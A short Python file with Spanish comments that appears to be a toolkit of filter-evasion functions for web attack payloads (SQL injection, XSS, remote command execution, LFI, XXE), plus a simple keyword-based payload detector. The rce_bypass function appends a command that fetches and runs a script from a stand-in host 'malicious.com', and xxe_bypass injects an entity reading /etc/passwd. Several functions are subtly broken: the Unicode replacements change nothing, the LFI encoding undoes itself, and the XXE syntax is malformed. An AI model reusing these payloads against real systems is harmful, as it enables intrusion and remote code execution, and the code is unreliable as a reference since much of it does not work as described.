# Funciones de Bypass para diferentes tipos de ataque

def basic_obfuscation(payload):
    """Aplica una ofuscación básica al payload, reemplazando caracteres clave."""
    return payload.replace("=", "%3D").replace(" ", "%20").replace("'", "%27").replace('"', "%22")

def unicode_bypass(payload):
    """Aplica un bypass utilizando Unicode en el payload."""
    return payload.replace("'", "\u0027").replace('"', "\u0022").replace("<", "\u003C").replace(">", "\u003E")

def sqli_comment_bypass(payload):
    """Aplica un bypass de comentarios en SQLi usando '--' o '/* ... */'"""
    return payload.replace("'", "'--").replace(";", ";--").replace("/*", "/*--").replace("*/", "--*/")

def rce_bypass(payload):
    """Añade comandos comunes a un RCE como 'wget', 'curl', '&&', '|'."""
    return payload + "; wget http://malicious.com/malware.sh && bash malware.sh"

def lfi_bypass(payload):
    """Realiza bypasses comunes en LFI, como el uso de '../' o '%2e%2e'."""
    return payload.replace("../", "%2e%2e/").replace("%2e%2e", "../")

def xxe_bypass(payload):
    """Realiza bypass en XXE mediante entidades externas o comentarios."""
    return payload.replace("<!DOCTYPE", "<!DOCTYPE [ENTITY % xxe SYSTEM 'file:///etc/passwd']>").replace("<", "&lt;")

# Función para verificar si el payload es válido
def validate_payload(payload):
    """Verifica que el payload no esté vacío o inválido."""
    if not payload or len(payload.strip()) == 0:
        raise ValueError("El payload no puede estar vacío o ser inválido.")
    return payload

# Función para analizar el tipo de ataque de manera básica
def analyze_payload(payload, attack_type):
    """Realiza un análisis básico dependiendo del tipo de ataque."""
    if attack_type == "SQLI":
        if "UNION" in payload or "SELECT" in payload or "INSERT" in payload:
            return "Posible ataque SQLi detectado"
        return "SQLi parece seguro"

    elif attack_type == "XSS":
        if "<script>" in payload or "javascript:" in payload:
            return "Posible ataque XSS detectado"
        return "XSS parece seguro"

    elif attack_type == "RCE":
        if any(cmd in payload for cmd in [";", "&&", "|", "wget", "curl"]):
            return "Posible RCE detectado"
        return "RCE parece seguro"

    elif attack_type == "LFI":
        if "../" in payload or "%2e%2e" in payload:
            return "Posible LFI detectado"
        return "LFI parece seguro"

    return "Análisis no disponible para este tipo de ataque"

